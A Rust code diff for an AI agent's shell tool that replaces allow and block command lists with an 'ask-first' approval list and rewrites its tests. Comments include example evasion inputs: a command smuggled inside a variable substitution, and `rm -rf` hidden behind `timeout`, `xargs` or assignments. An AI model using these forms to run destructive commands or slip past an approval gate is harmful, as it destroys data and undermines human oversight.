@@ -18,8 +18,8 @@ use crate::config::{
     SandboxNetworkConfig, SandboxSessionBusConfig, ShellAccessMode,
 };
 
-use super::{RunCommandGrant, ToolExecutionContext};
-use crate::commands::permissions::SegmentKind;
+use super::ToolExecutionContext;
+use crate::commands::permissions::{AskFirstDecision, AskFirstRow};
 
 const DEFAULT_BASH_TIMEOUT_MS: u64 = 300_000;
 const MAX_BASH_TIMEOUT_MS: u64 = 1_800_000;
@@ -125,32 +125,16 @@ async fn execute_bash_exec(
     let cwd = filesystem.authorize_cwd(params.cwd.as_deref().unwrap_or("."))?;
     let workspace_root = ensure_workspace_root(context)?;
 
-    let run_allowed = context.session_allowed_command_prefixes_snapshot();
-    let run_blocked = context.session_blocked_command_prefixes_snapshot();
-    match evaluate_command_policy(
+    if params.command.trim().is_empty() {
+        return Err("Shell command cannot be empty".to_string());
+    }
+    let run_removed = context.run_removed_ask_first_snapshot();
+    if let PolicyResult::AskFirst(rows) = evaluate_command_policy(
         &context.run_context.execution,
         &params.command,
-        &run_allowed,
-        &run_blocked,
+        &run_removed,
     ) {
-        PolicyResult::Allow => { /* proceed */ }
-        PolicyResult::Block {
-            segment_text,
-            matched_prefix,
-        } => {
-            let message = if segment_text.is_empty() {
-                "Shell command cannot be empty".to_string()
-            } else {
-                format!(
-                    "Command `{}` is blocked for this agent (matched prefix `{}`)",
-                    segment_text, matched_prefix
-                )
-            };
-            return Err(message);
-        }
-        PolicyResult::NeedsApproval(segments) => {
-            await_user_permission(deps, context, &params.command, segments).await?;
-        }
+        await_ask_first(deps, context, &params.command, rows).await?;
     }
 
     // Whether the model set timeoutMs itself — drives the recovery hint on a
@@ -295,266 +279,150 @@ fn sandbox_profile(
     }
 }
 
-/// Why a command was denied. Retained for the back-compat
-/// [`enforce_command_policy`] wrapper used by unit tests; new code paths
-/// branch on [`PolicyResult`] directly so they can surface per-segment
-/// info to the approval modal.
-#[allow(dead_code)]
-enum CommandDenial {
-    /// The command prefix is in the explicit block list — expected, no warning needed.
-    ExplicitlyBlocked(String),
-    /// The command prefix is not in the (non-empty) allow list — the user may not
-    /// have anticipated this, so a run warning is warranted.
-    NotInAllowList(String),
-}
-
-#[allow(dead_code)]
-impl CommandDenial {
-    fn message(&self) -> &str {
-        match self {
-            CommandDenial::ExplicitlyBlocked(msg) | CommandDenial::NotInAllowList(msg) => msg,
-        }
-    }
-}
-
-/// Builds the tool error for a denied command. The denied parts are listed
-/// once; a reason is stated next to the parts it covers.
-pub(crate) fn denied_segments_message(
-    segments: &[crate::commands::permissions::SegmentApproval],
-    decisions: &[crate::commands::permissions::SegmentDecision],
-) -> String {
-    use crate::commands::permissions::SegmentDecision;
-
-    // (reason, denied parts) in the order each reason first appears.
-    let mut groups: Vec<(Option<&str>, Vec<&str>)> = Vec::new();
-    let mut denied_parts: Vec<&str> = Vec::new();
-    for (segment, decision) in segments.iter().zip(decisions) {
-        let reason = match decision {
-            SegmentDecision::DenyOnce { reason } | SegmentDecision::DenyAlways { reason, .. } => {
-                reason
-                    .as_deref()
-                    .map(str::trim)
-                    .filter(|reason| !reason.is_empty())
-            }
-            // An allowed part was not denied, so it is not part of the error.
-            _ => continue,
-        };
-        denied_parts.push(segment.text.as_str());
-        match groups
-            .iter()
-            .position(|(group_reason, _)| *group_reason == reason)
-        {
-            Some(index) => groups[index].1.push(segment.text.as_str()),
-            None => groups.push((reason, vec![segment.text.as_str()])),
-        }
-    }
-
-    let quote = |parts: &[&str]| {
-        parts
-            .iter()
-            .map(|part| format!("`{part}`"))
-            .collect::<Vec<_>>()
-            .join(", ")
-    };
-
-    let mut message = "User denied one or more command segments".to_string();
-    if denied_parts.is_empty() {
-        message.push('.');
-        return message;
-    }
-    message.push_str(&format!(". Denied parts: {}", quote(&denied_parts)));
-
-    // One reason for the whole denial: state it plainly. Otherwise each
-    // reason names the parts it covers, so the model can tell them apart.
-    let reasons: Vec<(&str, &[&str])> = groups
+/// The tool error for a denied ask-first request: what was denied, the rule
+/// each part matched, and the user's reason when there is one.
+pub(crate) fn ask_first_denied_message(rows: &[AskFirstRow], reason: Option<&str>) -> String {
+    let denied = rows
         .iter()
-        .filter_map(|(reason, parts)| reason.map(|reason| (reason, parts.as_slice())))
-        .collect();
-    if reasons.len() == 1 && reasons[0].1.len() == denied_parts.len() {
-        message.push_str(&format!(". Reason: {}", reasons[0].0));
-    } else {
-        for (reason, parts) in reasons {
-            message.push_str(&format!(". Reason: {reason} for {}", quote(parts)));
-        }
+        .map(|row| format!("`{}` (ask-first rule `{}`)", row.text, row.rule))
+        .collect::<Vec<_>>()
+        .join(", ");
+    let mut message = format!("User denied {denied}");
+    if let Some(reason) = reason.map(str::trim).filter(|reason| !reason.is_empty()) {
+        message.push_str(&format!(". Reason: {reason}"));
     }
     message.push('.');
     message
 }
 
-/// Richer per-segment policy evaluation result. Distinguishes a hard
-/// block (any segment matched the blocklist) from "needs approval"
-/// (some segments aren't in the allowlist but aren't blocked either).
-/// The approval flow in `execute_bash_exec` uses this to decide whether
-/// to deny outright or raise an interactive prompt.
+/// What `bash_exec` does with a command.
+#[derive(Debug)]
 pub(crate) enum PolicyResult {
-    /// All segments pass.
+    /// Run it.
     Allow,
-    /// One or more segments hit a blocklist entry. Whole command denied.
-    Block {
-        segment_text: String,
-        matched_prefix: String,
-    },
-    /// Segments that need user approval (Simple-not-in-allowlist or any
-    /// Opaque in Restricted mode). Each carries the smart-prefix
-    /// suggestion the modal pre-fills.
-    NeedsApproval(Vec<crate::commands::permissions::SegmentApproval>),
+    /// Ask the user first. Holds every row of the command that matched an
+    /// ask-first rule.
+    AskFirst(Vec<AskFirstRow>),
 }
 
+/// Checks `command` against the agent's ask-first list. Only Restricted
+/// agents have one in force: Full checks nothing. `run_removed` holds the
+/// rules "Always allow" removed earlier in this run, which the run's
+/// settings snapshot still lists.
 pub(crate) fn evaluate_command_policy(
     execution: &ExecutionCapabilityConfig,
     command: &str,
-    run_allowed: &[RunCommandGrant],
-    extra_blocked_prefixes: &[String],
+    run_removed: &[String],
 ) -> PolicyResult {
     use crate::assistant::tools::command_splitter::{split_command, Segment};
-    use crate::assistant::tools::prefix_detector::{
-        by_any_reading, by_argument_command, by_head_name, by_run_command, suggest_prefix,
-    };
-    use crate::commands::permissions::SegmentApproval;
 
-    if command.trim().is_empty() {
-        return PolicyResult::Block {
-            segment_text: String::new(),
-            matched_prefix: "<empty>".to_string(),
-        };
+    if !matches!(execution.shell.mode, ShellAccessMode::Restricted) {
+        return PolicyResult::Allow;
     }
-    // No segments means nothing runs but shell grammar and comments.
-    let segments = split_command(command);
-
-    let mut approvals: Vec<SegmentApproval> = Vec::new();
-    let restricted = matches!(execution.shell.mode, ShellAccessMode::Restricted);
-    let durable_allowed_prefixes = if restricted {
-        execution.shell.effective_allowed_command_prefixes()
-    } else {
-        Vec::new()
-    };
-    let run_prefixes: Vec<String> = run_allowed
+    let rules: Vec<String> = execution
+        .shell
+        .ask_first_command_prefixes
         .iter()
-        .filter_map(|grant| match grant {
-            RunCommandGrant::Prefix(prefix) => Some(prefix.clone()),
-            RunCommandGrant::Exact(_) => None,
+        .filter(|rule| {
+            !run_removed
+                .iter()
+                .any(|removed| removed.trim() == rule.trim())
         })
+        .cloned()
         .collect();
 
+    // No segments means nothing runs but shell grammar and comments.
+    let segments = split_command(command);
     // A row the splitter could not name or parse may hide what runs in any
-    // row of the input (`x='a[$(rm -rf y)]'; echo $((x))`), so the
-    // blocklist also reads every word of each row.
+    // row of the input (`x='a[$(rm -rf y)]'; echo $((x))`), so the rules
+    // are also read against every word of each row.
     let any_exact = segments
         .iter()
         .any(|s| matches!(s, Segment::Exact(_) | Segment::Unparsed(_)));
-    for segment in &segments {
-        let text = segment.text();
-        let unparsed = matches!(segment, Segment::Unparsed(_) | Segment::Exact(_));
+    let rows: Vec<AskFirstRow> = segments
+        .iter()
+        .flat_map(|segment| {
+            let text = segment.text();
+            matching_rules(&rules, text, any_exact)
+                .into_iter()
+                .map(|rule| AskFirstRow {
+                    text: text.to_string(),
+                    rule,
+                })
+        })
+        .collect();
 
-        // Blocklist applies to every segment. Durable blocklist is checked
-        // first; run-scoped blocklist (this run's accepted `DenyAlways`
-        // decisions) is checked next so a fresh deny-always takes effect
-        // mid-run. A blocked name is also blocked when run by path or after
-        // assignments (`FOO=1 /usr/bin/rm`); the allowlist is not widened.
-        let blocked = |text: &str| {
-            find_matching_prefix(
-                &execution.shell.blocked_command_prefixes,
-                text,
-                PolicySide::Deny,
-            )
-            .or_else(|| find_matching_prefix(extra_blocked_prefixes, text, PolicySide::Deny))
-        };
-        // The blocklist sees the command the segment runs, and the head it
-        // runs it with: `timeout 60 rm -rf x` is blocked by `rm` and by
-        // `timeout`, `xargs rm` by `rm` and by `xargs`. It also sees every
-        // command a misread option could hide: `xargs -0I rm echo` by `rm`.
-        if let Some(matched) = blocked(text)
-            .or_else(|| by_head_name(text).and_then(|head| blocked(&head)))
-            .or_else(|| by_run_command(text).and_then(|cmd| blocked(&cmd)))
-            .or_else(|| by_argument_command(text).and_then(|cmd| blocked(&cmd)))
-            .or_else(|| by_any_reading(text).iter().find_map(|cmd| blocked(cmd)))
-            .or_else(|| {
-                any_exact
-                    .then(|| blocked_word_run(execution, extra_blocked_prefixes, text))
-                    .flatten()
-            })
-        {
-            return PolicyResult::Block {
-                segment_text: text.to_string(),
-                matched_prefix: matched,
-            };
-        }
-
-        // Approval only exists in Restricted mode: Full mode never
-        // prompts, so the blocklist is best-effort for Unparsed input it
-        // cannot see into. See `is_exact_only`.
-        let needs_approval = restricted;
-        if !needs_approval {
-            continue;
-        }
-
-        // Benign shell constructs never need approval. Test expressions
-        // (`[ ... ]`, `[[ ... ]]`, `test ...`) only compare strings/files,
-        // and segments that are purely variable assignments (`FOO=bar`)
-        // just set shell state — neither runs a program of its own. The
-        // checked-for carve-out (a command substitution / backtick inside
-        // them) is handled in `is_benign_shell_construct`: those DO run
-        // code, so they fall through to normal approval. Blocklist was
-        // already applied above, so this can't bypass a hard deny.
-        if !unparsed && is_benign_shell_construct(text) {
-            continue;
-        }
-
-        // Run-scoped grants hold what was accepted this run via
-        // `AllowOnce`/`AllowAlways`. Without consulting them, every bash
-        // call after a fresh approval would re-prompt mid-run: durable
-        // list updates land on the next session, and persistence does
-        // not mutate the running execution snapshot.
-        let kind = if segment.is_opaque() {
-            SegmentKind::Opaque
-        } else {
-            SegmentKind::Simple
-        };
-        let suggested_prefix = if unparsed {
-            String::new()
-        } else {
-            suggest_prefix(text)
-        };
-        let allowed = if is_exact_only(&suggested_prefix) {
-            run_allowed.contains(&RunCommandGrant::Exact(text.to_string()))
-        } else {
-            find_matching_prefix(&durable_allowed_prefixes, text, PolicySide::Allow).is_some()
-                || find_matching_prefix(&run_prefixes, text, PolicySide::Allow).is_some()
-        };
-        if !allowed {
-            approvals.push(SegmentApproval {
-                text: text.to_string(),
-                kind,
-                suggested_prefix,
-            });
-        }
-    }
-
-    if approvals.is_empty() {
+    if rows.is_empty() {
         PolicyResult::Allow
     } else {
-        PolicyResult::NeedsApproval(approvals)
+        PolicyResult::AskFirst(rows)
     }
 }
 
-/// The blocklist entry that starts one of the [`word_runs`] of `text`.
-fn blocked_word_run(
-    execution: &ExecutionCapabilityConfig,
-    extra_blocked_prefixes: &[String],
-    text: &str,
-) -> Option<String> {
-    word_runs(text).find_map(|run| {
-        execution
-            .shell
-            .blocked_command_prefixes
-            .iter()
-            .chain(extra_blocked_prefixes)
-            .find(|p| !p.trim().is_empty() && matches_prefix_literal(p.trim(), &run))
-            .cloned()
-    })
+/// Every rule of `rules` that names a command the row `text` runs, trimmed,
+/// once each, in list order. "Always allow" removes all of them, so the row
+/// does not ask again through another rule.
+///
+/// A rule matches the row as written, and also when the command is run by
+/// path or after assignments (`FOO=1 /usr/bin/rm`). The row is also read
+/// as the head it runs a command with and the command that head runs:
+/// `timeout 60 rm -rf x` matches `rm` and `timeout`, `xargs rm` matches
+/// `rm` and `xargs`. Every command a misread option could hide is read
+/// too: `xargs -0I rm echo` matches `rm`, and so are the commands `find`
+/// runs for its matches and the method `gh api` requests. When `any_exact`
+/// is set, some row of the input could not be named, so every run of words
+/// is read.
+fn matching_rules(rules: &[String], text: &str, any_exact: bool) -> Vec<String> {
+    use crate::assistant::tools::prefix_detector::{
+        by_any_reading, by_argument_command, by_find_action, by_head_name, by_run_command,
+        canonicalize_for_deny, gh_api_method_forms,
+    };
+
+    let mut readings: Vec<String> = std::iter::once(text.to_string())
+        .chain(by_head_name(text))
+        .chain(by_run_command(text))
+        .chain(by_argument_command(text))
+        .chain(by_any_reading(text))
+        .collect();
+    // `find` first, so the method of a `gh api` that `find` runs is read too.
+    let find_actions: Vec<String> = readings
+        .iter()
+        .map(String::as_str)
+        .flat_map(by_find_action)
+        .collect();
+    readings.extend(find_actions);
+    let gh_api_methods: Vec<String> = readings
+        .iter()
+        .map(String::as_str)
+        .flat_map(gh_api_method_forms)
+        .collect();
+    readings.extend(gh_api_methods);
+    // A rule cannot hide behind leading assignments or global options either:
+    // `FOO=bar rm` reads as `rm`, `git -C repo push` as `git push`.
+    let canonical: Vec<String> = readings
+        .iter()
+        .filter_map(|reading| canonicalize_for_deny(reading))
+        .collect();
+    readings.extend(canonical);
+    if any_exact {
+        readings.extend(word_runs(text));
+    }
+
+    let mut matched: Vec<String> = Vec::new();
+    for rule in rules.iter().map(|rule| rule.trim()) {
+        if !rule.is_empty()
+            && !matched.iter().any(|seen| seen == rule)
+            && readings
+                .iter()
+                .any(|reading| matches_prefix_literal(rule, reading))
+        {
+            matched.push(rule.to_string());
+        }
+    }
+    matched
 }
 
-/// Words a blocklist entry may span in [`word_runs`].
+/// Words a rule may span in [`word_runs`].
 const WORD_RUN: usize = 16;
 
 /// Each word of `text` with up to [`WORD_RUN`] words after it, joined by single spaces,
@@ -572,95 +440,6 @@ fn word_runs(text: &str) -> impl Iterator<Item = String> {
         .map(|word| word.rsplit('/').next().unwrap_or(word).to_string())
         .collect();
     (0..words.len()).map(move |at| words[at..words.len().min(at + WORD_RUN)].join(" "))
-}
-
-/// The rule for a row with no prefix to save: input the splitter could not
-/// parse (`Segment::Unparsed`), an Opaque segment whose commands it could
-/// not all identify, or a command no prefix names safely (bare `xargs`,
-/// which a prefix `xargs` would extend to every command). Such a row is
-/// asked as its exact text: "Allow once" covers that text alone and no
-/// "Always" is offered. Unparsed input needs that approval in Restricted
-/// mode only: Full mode never prompts, even while a blocklist is active.
-fn is_exact_only(suggested_prefix: &str) -> bool {
-    suggested_prefix.is_empty()
-}
-
-/// What an "Allow once" on `row` allows for the rest of the run.
-fn once_grant(row: &crate::commands::permissions::SegmentApproval) -> RunCommandGrant {
-    if is_exact_only(&row.suggested_prefix) {
-        RunCommandGrant::Exact(row.text.clone())
-    } else {
-        RunCommandGrant::Prefix(row.text.clone())
-    }
-}
-
-/// True for shell segments that have no execution surface of their own and
-/// therefore never need approval:
-///
-/// - **Test expressions** — `[ ... ]`, `[[ ... ]]`, or the `test` builtin.
-///   These only compare strings/files; they spawn no program.
-/// - **Pure assignments** — a segment whose every token is `NAME=value`
-///   (`FOO=bar`, `A=1 B=2`). These just set shell variables.
-/// - **Jumps** — `break`, `continue`, `return`, with at most a number.
-///   These only steer a loop or a function.
-///
-/// Carve-out: if the segment embeds a command substitution (`$(...)`) or
-/// backticks, it DOES run code — `[ -n "$(curl x)" ]` or `V=$(git log)` —
-/// so we report it as non-benign and let the normal approval path gate the
-/// embedded command. An assignment used as a *prefix* to a real command
-/// (`FOO=bar mycmd`) is likewise not benign: `mycmd` is a token that isn't
-/// an assignment, so the all-assignments check fails and we fall through.
-fn is_benign_shell_construct(text: &str) -> bool {
-    let trimmed = text.trim();
-    if trimmed.is_empty() {
-        return false;
-    }
-    // A command or process substitution runs arbitrary code — defer to
-    // normal approval so the embedded command is gated.
-    if crate::assistant::tools::command_splitter::has_substitution(trimmed) {
-        return false;
-    }
-
-    let mut tokens = trimmed.split_whitespace();
-    let Some(first) = tokens.next() else {
-        return false;
-    };
-
-    // Test expressions: the head token is the `test` builtin in one of its
-    // three spellings. Contents are side-effect-free (we already ruled out
-    // embedded substitutions above).
-    if first == "[" || first == "[[" || first == "test" {
-        return true;
-    }
-
-    if matches!(first, "break" | "continue" | "return") {
-        return tokens.all(|tok| tok.bytes().all(|b| b.is_ascii_digit()));
-    }
-
-    // Pure assignments: the head and every remaining token are `NAME=value`.
-    std::iter::once(first)
-        .chain(tokens)
-        .all(is_pure_assignment_token)
-}
-
-/// True if `tok` is a `NAME=value` assignment with a shell-valid name
-/// (leading letter/underscore, then alphanumerics/underscores). Mirrors the
-/// env-assignment recognizer used by the splitter and prefix detector.
-fn is_pure_assignment_token(tok: &str) -> bool {
-    let Some(eq) = tok.find('=') else {
-        return false;
-    };
-    if eq == 0 {
-        return false;
-    }
-    let mut chars = tok[..eq].chars();
-    let Some(first) = chars.next() else {
-        return false;
-    };
-    if !first.is_ascii_alphabetic() && first != '_' {
-        return false;
-    }
-    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
 }
 
 /// Cleans up an abandoned permission request when the approval-wait future
@@ -727,25 +506,22 @@ impl Drop for AbandonedApprovalGuard {
     }
 }
 
-/// Runs the interactive approval round-trip for a command that needs
-/// user input. Registers the request in app state, emits the request
-/// and attention events, waits for the user's decisions, and resolves to
-/// `Ok(())` if every segment was allowed or `Err(_)` on any deny / channel
-/// close. If the wait is abandoned without a decision, `AbandonedApprovalGuard`
-/// cancels the run so the model does not continue around a missing human
-/// decision. Persistence of "always" grants is performed by
-/// [`crate::commands::permissions::submit_permission_decision`] before the
-/// oneshot is fired, so the grant is durable across crashes between user click
-/// and command execution.
-async fn await_user_permission(
+/// Asks the user about a command that matched the ask-first list. Registers
+/// the request in app state, emits the request and attention events, waits
+/// for the decision, and resolves to `Ok(())` when the command may run or
+/// `Err(_)` carrying the user's reason on a denial. If the wait is abandoned
+/// without a decision, `AbandonedApprovalGuard` cancels the run so the model
+/// does not continue around a missing human decision. "Always allow" is saved
+/// on the agent by [`crate::commands::permissions::submit_permission_decision`]
+/// before the decision is delivered.
+async fn await_ask_first(
     deps: &crate::assistant::engine::AssistantDeps,
     context: &ToolExecutionContext,
     command: &str,
-    segments: Vec<crate::commands::permissions::SegmentApproval>,
+    rows: Vec<AskFirstRow>,
 ) -> Result<(), String> {
     use crate::commands::permissions::{
-        emit_attention, PendingApprovalOutcome, PermissionRequest, SegmentDecision,
-        PERMISSION_REQUEST_EVENT,
+        emit_attention, PendingApprovalOutcome, PermissionRequest, PERMISSION_REQUEST_EVENT,
     };
     use tauri::{Emitter, Manager};
 
@@ -753,17 +529,18 @@ async fn await_user_permission(
     let workspace_id = Some(deps.workspace_id.clone());
     let agent_id = context.run_context.automation_id.clone();
 
-    // The constructor resolves where an "always" decision would be saved — in
-    // this workspace for its Main, or on a shared definition in force wherever
+    // The constructor resolves where "Always allow" would be saved — in this
+    // workspace for its Main, or on a shared definition in force wherever
     // that teammate works.
     let request = PermissionRequest::for_agent(
         &app_state,
         workspace_id.clone(),
         agent_id,
         command.to_string(),
-        segments.clone(),
+        rows.clone(),
     );
     let request_id = request.request_id.clone();
+    let rules = request.rules();
 
     // Supersede: if a previous request for this exact run + command is
     // still pending, it is an orphan — its CLI transport dropped mid-call
@@ -803,12 +580,12 @@ async fn await_user_permission(
         armed: true,
     };
 
-    let decisions = match rx.await {
-        Ok(PendingApprovalOutcome::Decision(d)) => {
+    let decision = match rx.await {
+        Ok(PendingApprovalOutcome::Decision(decision)) => {
             // The submit command already removed the registry entry and
             // emitted `permissions://resolved`.
             abandon_guard.disarm();
-            d
+            decision
         }
         Ok(PendingApprovalOutcome::Superseded) => {
             // A fresh registration for the same run + command replaced
@@ -827,51 +604,31 @@ async fn await_user_permission(
         }
     };
 
-    // Cache the user's intent on the run-scoped allow/block lists
-    // BEFORE the deny short-circuit, so a `DenyAlways` still ends the
-    // current call with an error but its block-prefix is recorded so
-    // subsequent retries of the same command don't re-prompt.
-    //
-    // - `AllowAlways` caches the user's chosen prefix (also persisted
-    //   durably by the submit command).
-    // - `AllowOnce` caches the segment's full text: `matches_prefix`
-    //   accepts an exact match or an additional-args extension (so an
-    //   `AllowOnce` of `git status` covers `git status -s` in the same
-    //   run, matching what the durable `AllowAlways` semantics would
-    //   give for the same prefix). A row `is_exact_only` covers its
-    //   exact text only.
-    // - `DenyAlways` caches the user's chosen prefix on the run-scoped
-    //   blocklist (also persisted durably). Without this, the LLM's
-    //   next retry of the just-denied command would re-prompt the user
-    //   because persistence updates the DB but not the running
-    //   `context.execution` snapshot.
-    // - `DenyOnce` is intentionally not cached. It's a single-shot
-    //   decision by design — re-prompting on retry lets the user
-    //   reconsider. (The current call is still denied by the check
-    //   below.)
-    for (segment, decision) in segments.iter().zip(decisions.iter()) {
-        match decision {
-            SegmentDecision::AllowAlways { prefix, .. } => {
-                context.add_session_allowed_command(RunCommandGrant::Prefix(
-                    prefix.trim().to_string(),
-                ));
-            }
-            SegmentDecision::AllowOnce => {
-                context.add_session_allowed_command(once_grant(segment));
-            }
-            SegmentDecision::DenyAlways { prefix, .. } => {
-                context.add_session_blocked_command_prefix(prefix.clone());
-            }
-            SegmentDecision::DenyOnce { .. } => {}
+    apply_ask_first_decision(context, &rows, &rules, decision)
+}
+
+/// Applies the user's answer to the command waiting on it: `Ok(())` runs
+/// it, and a denial is the tool error. `rules` are the rules the command
+/// matched, which "Always allow" removed from the agent's list.
+fn apply_ask_first_decision(
+    context: &ToolExecutionContext,
+    rows: &[AskFirstRow],
+    rules: &[String],
+    decision: AskFirstDecision,
+) -> Result<(), String> {
+    match decision {
+        AskFirstDecision::AllowOnce => Ok(()),
+        AskFirstDecision::AlwaysAllow => {
+            // This run reads its settings from a snapshot taken at start, so
+            // the removal saved on the agent would not reach it.
+            context.add_run_removed_ask_first(rules);
+            Ok(())
+        }
+        AskFirstDecision::Deny { reason } => {
+            context.note_warning();
+            Err(ask_first_denied_message(rows, reason.as_deref()))
         }
     }
-
-    if decisions.iter().any(|d| !d.is_allow()) {
-        context.note_warning();
-        return Err(denied_segments_message(&segments, &decisions));
-    }
-
-    Ok(())
 }
 
 async fn execute_fs_request_grant(
@@ -997,10 +754,6 @@ fn access_to_str(access: FilesystemPathAccess) -> &'static str {
     }
 }
 
-/// Awaits the user's decision on a path-grant request. Mirrors
-/// [`await_user_permission`] for shape; the only differences are the
-/// request type, the registry it talks to, and the single-decision
-/// return shape (path grants aren't per-segment).
 /// Path-grant analogue of [`AbandonedApprovalGuard`]: clears a pending
 /// filesystem path-grant request, drops its card, and cancels the run when
 /// the approval-wait future is abandoned (run cancellation, or run-end
@@ -1055,6 +808,9 @@ impl Drop for AbandonedPathGrantGuard {
     }
 }
 
+/// Awaits the user's decision on a path-grant request. Mirrors
+/// [`await_ask_first`] for shape; the only differences are the
+/// request type and the registry it talks to.
 async fn await_path_grant_decision(
     deps: &crate::assistant::engine::AssistantDeps,
     context: &ToolExecutionContext,
@@ -1071,7 +827,7 @@ async fn await_path_grant_decision(
 
     // Supersede a stale orphaned request for the same run + path + access
     // (the model re-asked after a CLI transport drop). See the analogous
-    // block in `await_user_permission` for the full rationale.
+    // block in `await_ask_first` for the full rationale.
     for stale in app_state
         .pending_path_grants
         .take_superseded(
@@ -1125,109 +881,6 @@ async fn await_path_grant_decision(
             super::cancel_run_and_park(&context.cancel_token).await
         }
         Err(_) => abandon_guard.expire_and_stop().await,
-    }
-}
-
-/// Back-compat wrapper around [`evaluate_command_policy`]. Maps the
-/// richer result to the historic `Result<(), CommandDenial>` shape used
-/// by existing tests and by the legacy "silent deny" code path when the
-/// approval round-trip is unavailable (e.g., during shutdown).
-#[allow(dead_code)]
-fn enforce_command_policy(
-    execution: &ExecutionCapabilityConfig,
-    _workspace_root: Option<&std::path::Path>,
-    command: &str,
-) -> Result<(), CommandDenial> {
-    match evaluate_command_policy(execution, command, &[], &[]) {
-        PolicyResult::Allow => Ok(()),
-        PolicyResult::Block {
-            segment_text,
-            matched_prefix,
-        } => {
-            if segment_text.is_empty() {
-                Err(CommandDenial::ExplicitlyBlocked(
-                    "Shell command cannot be empty".to_string(),
-                ))
-            } else {
-                Err(CommandDenial::ExplicitlyBlocked(format!(
-                    "Command `{}` is blocked for this agent (matched prefix `{}`)",
-                    segment_text, matched_prefix
-                )))
-            }
-        }
-        PolicyResult::NeedsApproval(segs) => {
-            let first = segs.into_iter().next().unwrap();
-            let short = command_preview(&first.text);
-            Err(CommandDenial::NotInAllowList(format!(
-                "Command `{}` is not in the allowed list. Add `{}` to allow it.",
-                short, short
-            )))
-        }
-    }
-}
-
-/// Extract the first two words of a command for display (e.g. "kubectl get").
-fn command_preview(command: &str) -> String {
-    let mut words = command.split_whitespace();
-    match (words.next(), words.next()) {
-        (Some(cmd), Some(sub)) if !sub.starts_with('-') => format!("{} {}", cmd, sub),
-        (Some(cmd), _) => cmd.to_string(),
-        _ => command.to_string(),
-    }
-}
-
-/// Word-boundary prefix match for command-policy lists. Returns the first
-/// matching prefix on a hit.
-///
-/// Matching rules:
-///   - prefix "kubectl get" matches command "kubectl get pods"
-///   - prefix "kubectl" matches command "kubectl delete pods"
-///   - prefix "kubectl get" does NOT match command "kubectl delete pods"
-fn find_matching_prefix(prefixes: &[String], command: &str, side: PolicySide) -> Option<String> {
-    prefixes
-        .iter()
-        .find(|p| matches_prefix(p, command, side))
-        .cloned()
-}
-
-/// Which policy list a prefix is matched against. The blocklist consults
-/// every canonical form — more forms can only block more. The allowlist
-/// consults only the form that keeps config-injecting options verbatim,
-/// so `git -c <cfg>=<cmd> diff` never rides a saved `git diff` grant.
-#[derive(Clone, Copy, PartialEq, Eq)]
-enum PolicySide {
-    Allow,
-    Deny,
-}
-
-fn matches_prefix(prefix: &str, command: &str, side: PolicySide) -> bool {
-    let p = prefix.trim();
-    if p.is_empty() {
-        return false;
-    }
-    if matches_prefix_literal(p, command) {
-        return true;
-    }
-    // Fall back to the command's canonical forms so an allowlist entry the
-    // suggester proposed still matches the raw command it came from. The
-    // suggester strips leading env assignments and global flags between the
-    // binary and its subcommand (`git --no-pager log` → `git log`); the
-    // literal match above does not, so without this an "Always allow git
-    // log" grant would never cover a `git --no-pager log` invocation. The
-    // blocklist additionally consults the fully-stripped form (a blocked
-    // `rm` can't hide behind `FOO=bar rm`, a blocked `git push` behind
-    // `git -C repo push`).
-    let matches_form =
-        |form: Option<String>| form.is_some_and(|canonical| matches_prefix_literal(p, &canonical));
-    let allow_form = crate::assistant::tools::prefix_detector::canonicalize_for_allow(command);
-    match side {
-        PolicySide::Allow => matches_form(allow_form),
-        PolicySide::Deny => {
-            matches_form(allow_form)
-                || matches_form(
-                    crate::assistant::tools::prefix_detector::canonicalize_for_deny(command),
-                )
-        }
     }
 }
 
@@ -1707,12 +1360,7 @@ mod tests {
             }),
             had_warnings: Default::default(),
             session_grants: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
-            session_allowed_command_prefixes: std::sync::Arc::new(
-                std::sync::Mutex::new(Vec::new()),
-            ),
-            session_blocked_command_prefixes: std::sync::Arc::new(
-                std::sync::Mutex::new(Vec::new()),
-            ),
+            run_removed_ask_first: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
         }
     }
 
@@ -2055,640 +1703,364 @@ mod tests {
     }
 
     // ------------------------------------------------------------------
-    // enforce_command_policy — agent policy wiring
+    // evaluate_command_policy — the ask-first list
     // ------------------------------------------------------------------
 
     use crate::config::types::ShellCapabilityConfig;
     use crate::config::{ExecutionCapabilityConfig, ShellAccessMode};
 
-    fn restricted_execution_config(
-        allowed: &[&str],
-        blocked: &[&str],
-    ) -> ExecutionCapabilityConfig {
+    fn config_in(mode: ShellAccessMode, rules: &[&str]) -> ExecutionCapabilityConfig {
         ExecutionCapabilityConfig {
             shell: ShellCapabilityConfig {
-                mode: ShellAccessMode::Restricted,
-                allowed_command_prefixes: allowed.iter().map(|s| s.to_string()).collect(),
-                blocked_command_prefixes: blocked.iter().map(|s| s.to_string()).collect(),
+                mode,
+                ask_first_command_prefixes: rules.iter().map(|s| s.to_string()).collect(),
             },
             ..Default::default()
         }
     }
 
-    fn full_execution_config(blocked: &[&str]) -> ExecutionCapabilityConfig {
-        ExecutionCapabilityConfig {
-            shell: ShellCapabilityConfig {
-                mode: ShellAccessMode::Full,
-                allowed_command_prefixes: vec![],
-                blocked_command_prefixes: blocked.iter().map(|s| s.to_string()).collect(),
-            },
-            ..Default::default()
+    /// A Restricted (Ask first) agent whose ask-first list is `rules`.
+    fn ask_first_config(rules: &[&str]) -> ExecutionCapabilityConfig {
+        config_in(ShellAccessMode::Restricted, rules)
+    }
+
+    /// A Full agent with `rules` on its ask-first list, which Full never reads.
+    fn full_execution_config(rules: &[&str]) -> ExecutionCapabilityConfig {
+        config_in(ShellAccessMode::Full, rules)
+    }
+
+    /// The rows `command` asks about; empty when it runs without asking.
+    fn asked(exec: &ExecutionCapabilityConfig, command: &str) -> Vec<AskFirstRow> {
+        match evaluate_command_policy(exec, command, &[]) {
+            PolicyResult::AskFirst(rows) => rows,
+            PolicyResult::Allow => Vec::new(),
+        }
+    }
+
+    fn asks_first(exec: &ExecutionCapabilityConfig, command: &str) -> bool {
+        !asked(exec, command).is_empty()
+    }
+
+    #[test]
+    fn ask_first_reads_every_command_of_the_input() {
+        // The matcher's readings of each row, each run against a rule on the
+        // ask-first list.
+        let cases: &[(&str, &str)] = &[
+            ("git push", "git push"),
+            ("git push", "git push --force origin main"),
+            ("git push", "cd x && git push"),
+            ("git push", "git log | git push"),
+            ("git push", "timeout 60 git push origin main"),
+            ("git push", "git -C ../r push"),
+            ("git push", "git -c x=y push"),
